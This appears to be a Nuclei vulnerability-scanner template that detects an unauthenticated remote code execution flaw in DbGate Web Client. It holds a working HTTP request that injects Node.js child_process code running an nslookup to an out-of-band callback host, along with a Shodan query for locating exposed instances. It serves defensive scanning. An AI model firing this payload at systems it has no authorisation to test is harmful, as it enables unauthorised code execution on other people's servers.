http:
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(body, '\"runid\"')
    - contains(interactsh_protocol, "dns")
    type: dsl
  raw:
  - 'POST /runners/start HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json


    {"script":"process.mainModule.require(''child_process'').exec(''nslookup {{interactsh-url}}'')"}

    '
id: dbgate-unauth-rce
info:
  author: h0j3n
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
  description: 'DbGate Web Client Management is suspectible to an unauthenticated
    remote code execution vulnerability.

    '
  metadata:
    max-request: 1
    shodan-query: http.favicon.hash:1198579728
  name: DbGate Web Client - Unauthenticated Remote Command Execution
  reference:
  - https://github.com/dbgate/dbgate
  - https://dbgate.org/docs/env-variables.html
  severity: critical
  tags: http,rce,oast,electron,dbgate,oss,vuln
